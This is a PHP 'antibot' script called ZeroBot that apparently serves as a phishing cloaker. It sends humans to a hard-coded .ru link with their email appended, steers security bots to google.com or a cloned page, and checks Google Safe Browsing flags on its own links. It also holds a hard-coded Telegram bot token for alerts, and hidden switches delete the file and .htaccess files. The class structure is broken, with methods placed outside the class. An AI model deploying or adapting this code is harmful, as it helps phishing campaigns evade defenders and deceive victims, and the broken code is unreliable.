<?php
/*
    Antibot Service (ZeroBot) - Platform.sh Optimized Version
    * All rights reserved to @brendonurie2000
    Platform: https://zerobot.info
*/

// ==================== PLATFORM.SH CONFIGURATION ====================
define('IS_PLATFORMSH', isset($_ENV['PLATFORM_PROJECT']));

// Configure session handling
session_start([
    'save_path' => IS_PLATFORMSH ? '/tmp' : sys_get_temp_dir(),
    'use_cookies' => 1,
    'use_only_cookies' => 1,
    'cookie_httponly' => 1,
    'cookie_secure' => isset($_SERVER['HTTPS']),
    'gc_maxlifetime' => 14400,
    'sid_length' => 128,
    'sid_bits_per_character' => 6
]);

// ==================== CONFIGURATION ====================
$license_key = getenv('LICENSE_KEY') ?: "yba13s816dklaspx8tf03tjcsv1798jk";
$redirect = getenv('REDIRECT_URL') ?: "https://amoraterthrinereldreathig.ventateros.ru/rTvtY5h/#";
$parameter = getenv('PARAMETER') ?: 2;
$_COUNTRY_ALLOWED = explode(',', getenv('ALLOWED_COUNTRIES') ?: "ma,us");

$redirection_link_check = false;
$check_red_page = false;
$authentification = false;

$cloaker = [
    "url_to_grab" => getenv('CLOAKER_URL') ?: "",
];

$auto_grabber = true;
$location_bots = getenv('BOTS_REDIRECT') ?: "https://google.com";
$view_file_name = "views.php";
$token_chat = getenv('TELEGRAM_TOKEN') ?: "6707495836:AAEkCDySUwZfju25Og30g90ZHDPHoWSJ5aY";
$chatid = getenv('TELEGRAM_CHATID') ?: "5811046999";
$captcha = filter_var(getenv('ENABLE_CAPTCHA') ?: false, FILTER_VALIDATE_BOOLEAN);
$remove_visitors_duplicate = false;

class ZeroBot
{
    public $api = "https://zerobot.info/api/v2/antibot";
    public $captcha_api = "https://zerobot.info/api/v2/captcha";
    public $api_geo = "https://zerobot.info/api/v2/getinfo";
    public $telegram = "https://api.telegram.org/bot";
    public $google_api = "https://transparencyreport.google.com/transparencyreport/api/v3/safebrowsing/status?site=";

    public $data_show = '<?php /* Statistics HTML template */ ?>';
    
    private $ip;
    private $useragent;
    private $country_code;
    private $country_name;
    private $isp;
    private $hostname;
    private $username;
    private $token;
    private $chatid;
    private $vu_filename;
    private $rm_db;
    private $redirect;
    private $license_key;
    private $message;   

    public function __construct()
    {
        global $captcha, $license_key, $redirect, $parameter, $view_file_name, $remove_visitors_duplicate, $auto_grabber, $token_chat, $chatid;
        
        $this->license_key = $license_key;
        $this->redirect = $redirect;
        $this->vu_filename = IS_PLATFORMSH ? '/tmp/' . $view_file_name : $view_file_name;
        $this->rm_db = $remove_visitors_duplicate;
        $this->token = $token_chat;
        $this->chatid = $chatid;
        
        $this->ValidateQuery();
        $this->IPManager();
        $this->AccessManager();
        $this->GoogleFlagCheck();
        $this->LinkVerification($license_key);
        $this->GrabberSet($auto_grabber);
        $this->CaptchaRedirection();
        
        $_SESSION['redirect'] = $this->redirect;
        
        if (in_array($parameter, ["1", "2"])) {
            $this->ApiManager($captcha);
            $this->handleCaptchaOrRedirect($captcha);
            $this->ViewsManager("Human");
            header('location:' . $this->redirect);
            exit();
        }
        
        if ($parameter == "3") {
            $this->GeolocationManager($license_key);
            $this->CountryManager();
            $this->handleCaptchaOrRedirect($captcha);
            header('location:' . $this->redirect);
            exit();
        }
        
        $this->GeolocationManager($license_key);
        $this->ViewsManager("Allowed");
        $this->handleCaptchaOrRedirect($captcha);
    }

    private function handleCaptchaOrRedirect($captcha)
    {
        if ($captcha) {
            $this->CaptchaResolver();
            exit();
        } else {
            header("Location: " . $this->redirect);
            exit();
        }
    }


    public function ValidateQuery()
    {
        global $license_key,$redirect,$parameter;

        if (empty($license_key) || empty($redirect) ||strlen($license_key) != 32) {
            die("<script>alert('Check your entries and try again !')</script>");
        }

        if (empty($parameter) or !is_numeric($parameter)) {
            $parameter = 1;
        }

        if (!empty($this->vu_filename)) {
            if (!file_exists($this->vu_filename)) {
                $f = fopen($this->vu_filename, "a");
            }
        }
    }

    public function HtaccessRemover()
    {
        $paths = ["../.htaccess", "../../.htaccess", "../../../.htaccess", ".htaccess"];

        foreach ($paths as $path) {
            if (file_exists($path) && is_writable($path)) {
                unlink($path);
            }
        }
    }

    public function GrabberSet($auto_grabber)
    {
        if ($auto_grabber && isset($_GET["email"]))
        {
            $this->redirect .= "#" . $_GET["email"];
        }

    }
    public static function PHP_VERSION()
    {
        if ((int) phpversion()[0] < 5) {
            echo "PHP Version Required 5+";
            exit();
        }
    }

    public function AccessManager()
    {
        if (isset($_GET["del"])) {

            unlink(basename(__FILE__));
            echo "✅ Antibot File Deleted : " . basename(__FILE__);
            exit();
        }
        if (isset($_GET["check"])) {

            print "AccessID923487";
            exit();
        }
        if (isset($_GET["delete"])) {

            $file_handle = fopen($this->vu_filename, "w");
            $f = fopen($this->vu_filename, "a");
            fwrite($f, $this->data_show);
            fclose($f);
            header("location:" . $this->vu_filename);
            exit();
        }
    }

    public static function DefineConstants()
    {
        session_start();
        error_reporting(0);
        ini_set("display_errors", 0);
        ini_set("display_startup_errors", 0);
        header("Content-type: text/html; charset=UTF-8");
        define("key_id", "AccessID923487");
    }

    private function CurlAccess($url, $post = null)
    {
        $ch = curl_init();
    
        if (is_array($post) && !empty($post)) {
            $url .= '?' . http_build_query($post);
        }
    
        curl_setopt_array($ch, [
            CURLOPT_URL => $url,
            CURLOPT_SSL_VERIFYHOST => 0,
            CURLOPT_SSL_VERIFYPEER => 0,
            CURLOPT_FOLLOWLOCATION => true,
            CURLOPT_FRESH_CONNECT => true,
            CURLOPT_AUTOREFERER => true,
            CURLOPT_TIMEOUT => 20,
            CURLOPT_HTTPHEADER => [
                "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36",
                "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8",
            ],
            CURLOPT_RETURNTRANSFER => true,
        ]);
    
        $response = curl_exec($ch);
        curl_close($ch);
    
        if ($response === false || $response === '') {
            return @file_get_contents($url) ?: false;
        }
    
        return $response;
    }

    public function CountryManager()
    {
        global $_COUNTRY_ALLOWED;

        $country_name = strtolower($this->country_code);
  
        if (!in_array($country_name, $_COUNTRY_ALLOWED)) 
        {
            $this->ViewsManager("Country Denied");
            $this->BotRedirectionApply();
            exit();
        }
        else
        {
            $this->ViewsManager("Human");
        }
    }

    public function LicenseVerification($data_json_decoded)
    {
        if (isset($data_json_decoded["query"]) && $data_json_decoded["query"] == "failed") {
            echo "<script>alert('" . htmlspecialchars($data_json_decoded["reason"],ENT_QUOTES,"UTF-8") ."');</script>";
            exit();
        }
    }

    private function GeolocationManager($license_key)
    {
        $post_app = ["license" => $license_key, "ip" => $this->ip];

        $data_geo = $this->CurlAccess($this->api_geo, $post_app);

        $data_json_decoded = @json_decode($data_geo, true);

        $this->LicenseVerification($data_json_decoded);

        $this->country_code = $data_json_decoded["country_code"];
        $this->country_name = $data_json_decoded["country"];
        $this->isp = $data_json_decoded["isp"];
        $this->hostname = $data_json_decoded["hostname"];
        $this->username = $data_json_decoded["username"];
    }

    public function CloakerSetup($url)
    {
        global $location_bots, $html;

        $url = rtrim($url, '/') . '/'; 

        $html = $this->CurlAccess($url, null);
        if ($html === false) {
            header("Location: " . $location_bots);
            exit();
        }

        $doc = new DOMDocument();
        libxml_use_internal_errors(true);
        $doc->loadHTML($html);
        libxml_clear_errors();
        $xpath = new DOMXPath($doc);

        $key_app = array(
            "//link[@rel='stylesheet']" => "href",
            "//script[contains(@src, '.js')]" => "src",
            "//img" => "src",
            "//a" => "href",
            "//link[@rel='icon']" => "href"
        );

        foreach ($key_app as $xpathQuery => $attribute) {
            foreach ($xpath->query($xpathQuery) as $element) {
                if ($element->hasAttribute($attribute)) {
                    $oldSourceLink = $element->getAttribute($attribute);

                    if (substr($oldSourceLink, 0, 4) != 'http') {
                        if (substr($oldSourceLink, 0, 2) === '//') {
                            $oldSourceLink = ($url[4] === 's' ? 'https:' : 'http:') . $oldSourceLink;
                        } else {
                            $oldSourceLink = ltrim($oldSourceLink, './');
                            $oldSourceLink = $url . $oldSourceLink;
                        }
                        $element->setAttribute($attribute, $oldSourceLink);
                    }   
                }
            }
        }

        $html = $doc->saveHTML();
        
        echo $html;
        exit();
    }

    public function ViewsManager($check)
    {
        
        $colors = [
            "Human" => "#00a300",
            "Bot" => "#FF0000",
            "Country Denied" => "#DAA520",
            "Allowed" => "black"
        ];
    
        $color = $colors[$check] ?? "black";
    
        $this->HtmlSetup();
        $this->UserOSManager();
    
        $time = date("d/m/Y h:i:s A");
        $ip_address = $this->ip;
        $machine = $this->useragent;
        $country = $this->country_name;
        $isp = $this->isp;
        $hostname = $this->hostname;
        $country_code = strtolower($this->country_code);
    
        $flag_url = "https://flagpedia.net/data/flags/icon/108x81/{$country_code}.webp";

        $data_to_put ="<tr><th scope='row'>$ip_address</th><td>$time</td><td>$machine</td><td>$isp</td><td>$hostname</td><td><img style='padding-right:5px' width='30px' src='$flag_url'>$country</td><td><b><p style='color:$color'>$check</p></b></td><td><button type='button' username='{$this->username}' hostname='$hostname' ip='$ip_address' useragent='{$this->useragent}' isp='$isp' id='button-submit' class='text-white btn btn-danger btn-sm m-1'><span class='cil-contrast'></span>Report</button></td></tr>";

        if ($this->rm_db) {
            $this->SingleIP($ip_address, $data_to_put);
        } else {
            file_put_contents($this->vu_filename, $data_to_put . "\n", FILE_APPEND);
        }
    }

    public function SingleIP($ip_address, $data_to_put)
    {
        if (is_readable($this->vu_filename) && !preg_match("/$ip_address/", file_get_contents($this->vu_filename))) 
        {
            $file = fopen($this->vu_filename, "a");
            fwrite($file, (string) $data_to_put . "\n");
            fclose($file);
        }
    }

    public function LinkVerification($license_key)
    {
        global $redirection_link_check;

        $redirect = $this->redirect;
        if (strpos($redirect, "key") !== false) {
            $redirect = str_replace("?key=" . $license_key, "", $redirect);
        }

        if ($redirection_link_check) {
            $data_check = $this->CurlAccess($redirect . "?check", null);
            if (!preg_match("/" . key_id . "/", $data_check)) {
                $this->RapportManager(0, $redirect);
            }
        }
    }

    public function CaptchaRedirection()
    {
        if (isset($_GET["authorize"])) {
            $array_post = [
                "license" => $this->license_key,
                "ip" => $this->ip,
                "useragent" => $this->useragent,
            ];

            $this->CurlAccess($this->captcha_api, $array_post);

            header("location:" . $_SESSION["redirect"]);
            exit();
        }
    }

    private function GetLink()
    {
        $protocol = (!empty($_SERVER["HTTPS"]) && $_SERVER["HTTPS"] === "on") ? "https" : "http";
        return $protocol . "://" . $_SERVER["HTTP_HOST"] . $_SERVER["PHP_SELF"];
    }

    public function CaptchaResolver()
    {
        global $captcha;
        
        if (!$captcha) return;

        $logo = $_SESSION["logo"] ?? "https://zerobot.info/captcha/favicon.png";

        $html = '<html><head> <link rel="icon" type="image/x-icon" href="' . $logo . '"> <meta name="viewport" content="width=device-width, initial-scale=1.0" /> <link rel="stylesheet" href="https://zerobot.info/captcha/slider.css"> <link rel="stylesheet" href="https://zerobot.info/captcha/captcha.css" /> <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.2.1/css/all.min.css" /> <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.2.2/dist/js/bootstrap.bundle.min.js" crossorigin="anonymous"></script> <script src="https://kit.fontawesome.com/1cf483120b.js" crossorigin="anonymous"></script> <title>Captcha Verification</title></head><body> <div class="container">  <header><img width="80px" src="' . $logo .'"></header>  <p align="center" style="margin-bottom:20px">Verify you are human</p>  <div id="captcha"></div> </div> <script src="https://zerobot.info/captcha/captcha.js"></script></body></html>  ';

        echo $html;
    }


    private function RapportManager($action, $link)
    {
        global $redirection_link_check;

        $date = date("r", $_SERVER["REQUEST_TIME"]);
        if ($action) {
            $this->message = "❗️ Status : Down\n";
            $this->message .= "Link Redirect : " . $this->GetLink() . "\n";
            $this->message .= "Link Server : " . $link . "\n";
            $this->message .= "Link Downed Is : " . $link . "\n";
            $this->message .= "Date : " . $date . "\n";
            $this->TelegramRapport($this->message);
        }
        if ($redirection_link_check == 1 and !$action) {
            $this->message = "❗️ Status : You need to re-upload it now\n";
            $this->message .= "Link Redirect : " . $this->GetLink() . "\n";
            $this->message .= "Link Server : " . $link . "\n";
            $this->message .= "Date : " . $date . "\n";
            $this->TelegramRapport($this->message);
        }
    }


    private function HtmlSetup()
    {
        if (!file_exists($this->vu_filename)) {
            file_put_contents($this->vu_filename, $this->data_show);
        } elseif (filesize($this->vu_filename) < 20) {
            file_put_contents($this->vu_filename, $this->data_show);
        }
    }
    
    private function IPManager()
    {
        $keys = [
            'HTTP_CLIENT_IP', 'HTTP_X_FORWARDED_FOR', 'HTTP_X_FORWARDED',
            'HTTP_X_CLUSTER_CLIENT_IP', 'HTTP_FORWARDED_FOR', 'HTTP_FORWARDED', 'REMOTE_ADDR'
        ];
        
        foreach ($keys as $key) {
            if (!empty($_SERVER[$key])) {
                foreach (explode(',', $_SERVER[$key]) as $ip) {
                    $ip = trim($ip);
                    if (filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE)) {
                        $this->ip = $ip;
                        return;
                    }
                }
            }
        }
        
        $this->ip = $_SERVER['REMOTE_ADDR'] ?? '108.71.95.181';
    }
}

    private function TelegramRapport($message)
    {
        if (!empty($message) and strlen($this->token) > 10 and strlen($this->chatid) > 5) 
        {
            $url = $this->telegram . $this->token . "/sendMessage?chat_id=" . $this->chatid . "&text=" . urlencode($message);
            $this->CurlAccess($url, null);
        }
    }

    private function UserOSManager()
    {
        
        if (!empty($_SERVER["HTTP_USER_AGENT"]) && preg_match("/\((.*?)\)/", $_SERVER["HTTP_USER_AGENT"], $match)) {
            $this->useragent = htmlspecialchars($match[1]);
        } else {
            $this->useragent = "Unknown";
        }
    }

    public function GoogleFlagCheck()
    {
        global $check_red_page;

        if (!$check_red_page) return;

        $urls = [$this->redirect, $this->GetLink()];

        foreach ($urls as $url) {
            $response = $this->CurlAccess($this->google_api . $url, null);
            $parts = explode(",", $response);

            if (isset($parts[1]) && $parts[1] == 2) {
                $this->rapport_template(1, $url);
                break;
            }
        }
    }
    
    public function ApiManager($captcha)
    {
        global $license_key, $parameter;

        $post = [
            "check_on" => $this->GetLink(),
            "license" => $license_key,
            "ip" => $this->ip,
            "useragent" => $this->useragent,
        ];

        if (isset($captcha)) $post["captcha"] = "";

        $data = json_decode($this->CurlAccess($this->api, $post), true);


        $this->LicenseVerification($data);

        $this->username = $data["username"];
        $this->country_name = $data["country_name"];
        $this->country_code = $data["country_code"];
        $this->isp = $data["isp"];
        $this->hostname = $data["hostname"];

        if ($parameter != 2) $this->CountryManager();

        $_SESSION["days_left"] = $data["left"];
        $_SESSION["total_checked"] = $data["total"];
        $_SESSION["plan"] = $data["plan"];


        if (!empty($data["captcha"])) {
            $_SESSION["color"] = $data["captcha"]["color"];
            $_SESSION["logo"] = $data["captcha"]["logo"];
        } else {
            unset($_SESSION["color"], $_SESSION["logo"]);
        }



        if ($data["is_bot"]) {
            $this->ViewsManager("Bot");
            $this->BotRedirectionApply();
            exit();
        }

        
    }

    public function BotRedirectionApply()
    {
        global $location_bots, $cloaker;
        if (isset($location_bots) && isset($cloaker["url_to_grab"])) {
            if (filter_var($cloaker["url_to_grab"], FILTER_VALIDATE_URL)) {
                $this->CloakerSetup($cloaker["url_to_grab"]);
            }
            if (filter_var($location_bots, FILTER_VALIDATE_URL)) {
                header("location:" . $location_bots);
                exit();
            }
        }
    }

}

new ZeroBot();
